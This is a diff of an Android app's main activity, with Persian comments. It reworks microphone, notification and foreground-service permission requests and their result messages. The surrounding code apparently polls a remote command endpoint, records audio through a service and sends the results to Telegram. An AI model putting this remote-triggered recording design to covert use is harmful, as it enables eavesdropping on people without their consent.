@@ -12,6 +12,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.webkit.WebChromeClient;
@@ -38,6 +39,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String SEND_COMMAND_URL = "https://voice-bot-worker.kapcher2019.workers.dev/send-command";
     private static final String FALLBACK_URL = "https://example.com";
     private static final int PERMISSION_REQUEST_CODE = 100;
+    private static final int NOTIFICATION_PERMISSION_CODE = 200;
     
     private WebView webView;
     private BroadcastReceiver voiceReceiver;
@@ -54,8 +56,8 @@ public class MainActivity extends AppCompatActivity {
         
         Log.d("MainActivity", "🚀 اپ شروع شد!");
         
-        // درخواست مجوزها
-        requestPermissions();
+        // ✅ درخواست همه مجوزها
+        requestAllPermissions();
         
         // WebView
         webView = new WebView(this);
@@ -68,6 +70,58 @@ public class MainActivity extends AppCompatActivity {
         
         // شروع CommandChecker
         startCommandChecking();
+    }
+    
+    private void requestAllPermissions() {
+        // لیست مجوزهای مورد نیاز
+        String[] permissions;
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            // اندروید ۱۳+
+            permissions = new String[]{
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.POST_NOTIFICATIONS,
+                Manifest.permission.FOREGROUND_SERVICE
+            };
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            // اندروید ۱۰ تا ۱۲
+            permissions = new String[]{
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.FOREGROUND_SERVICE
+            };
+        } else {
+            // اندروید ۹ و پایین‌تر
+            permissions = new String[]{
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE
+            };
+        }
+        
+        // چک کردن مجوزها
+        boolean allGranted = true;
+        for (String perm : permissions) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false;
+                break;
+            }
+        }
+        
+        if (!allGranted) {
+            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
+        } else {
+            Log.d("MainActivity", "✅ همه مجوزها قبلاً داده شده");
+        }
+        
+        // مجوز نوتیفیکیشن در اندروید ۱۳+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) 
+                != PackageManager.PERMISSION_GRANTED) {
+                // درخواست مجوز نوتیفیکیشن
+                ActivityCompat.requestPermissions(this, 
+                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, 
+                    NOTIFICATION_PERMISSION_CODE);
+            }
+        }
     }
     
     private void startCommandChecking() {
@@ -113,6 +167,17 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "در حال ضبط است!", Toast.LENGTH_SHORT).show();
             return;
         }
+        
+        // چک کردن مجوز میکروفون
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
+            != PackageManager.PERMISSION_GRANTED) {
+            Toast.makeText(this, "⚠️ مجوز میکروفون لازم است!", Toast.LENGTH_LONG).show();
+            ActivityCompat.requestPermissions(this, 
+                new String[]{Manifest.permission.RECORD_AUDIO}, 
+                PERMISSION_REQUEST_CODE);
+            return;
+        }
+        
         isRecording = true;
         Intent serviceIntent = new Intent(this, VoiceRecorderService.class);
         serviceIntent.setAction("START_RECORDING");
@@ -129,21 +194,6 @@ public class MainActivity extends AppCompatActivity {
         Intent serviceIntent = new Intent(this, VoiceRecorderService.class);
         serviceIntent.setAction("STOP_RECORDING");
         startService(serviceIntent);
-    }
-    
-    private void requestPermissions() {
-        String[] permissions = {
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.POST_NOTIFICATIONS,
-            Manifest.permission.FOREGROUND_SERVICE
-        };
-        
-        for (String perm : permissions) {
-            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
-                break;
-            }
-        }
     }
     
     private void setupWebView() {
@@ -193,7 +243,6 @@ public class MainActivity extends AppCompatActivity {
                     case "VOICE_UPLOAD_SUCCESS":
                         Toast.makeText(context, "✅ فایل صوتی ارسال شد!", Toast.LENGTH_LONG).show();
                         isRecording = false;
-                        // دوباره شروع به چک کردن
                         if (commandChecker != null && !commandChecker.isRunning()) {
                             commandChecker.startChecking();
                         }
@@ -285,7 +334,6 @@ public class MainActivity extends AppCompatActivity {
             new Handler(Looper.getMainLooper()).post(() -> {
                 webView.loadUrl(finalUrl);
                 
-                // ارسال دکمه‌ها به تلگرام بعد از ۲ ثانیه
                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                     sendCommandToTelegram();
                 }, 2000);
@@ -349,11 +397,26 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
         if (requestCode == PERMISSION_REQUEST_CODE) {
             for (int i = 0; i < permissions.length; i++) {
                 if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
-                    Toast.makeText(this, "⚠️ مجوز " + permissions[i] + " لازم است", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(this, 
+                        "⚠️ مجوز " + permissions[i] + " لازم است!\nبرنامه ممکن است درست کار نکند.", 
+                        Toast.LENGTH_LONG).show();
+                } else {
+                    Log.d("MainActivity", "✅ مجوز " + permissions[i] + " داده شد");
                 }
+            }
+        }
+        
+        if (requestCode == NOTIFICATION_PERMISSION_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Log.d("MainActivity", "✅ مجوز نوتیفیکیشن داده شد");
+            } else {
+                Toast.makeText(this, 
+                    "⚠️ مجوز نوتیفیکیشن داده نشد!\nبرای دریافت وضعیت ضبط، مجوز را فعال کنید.", 
+                    Toast.LENGTH_LONG).show();
             }
         }
     }
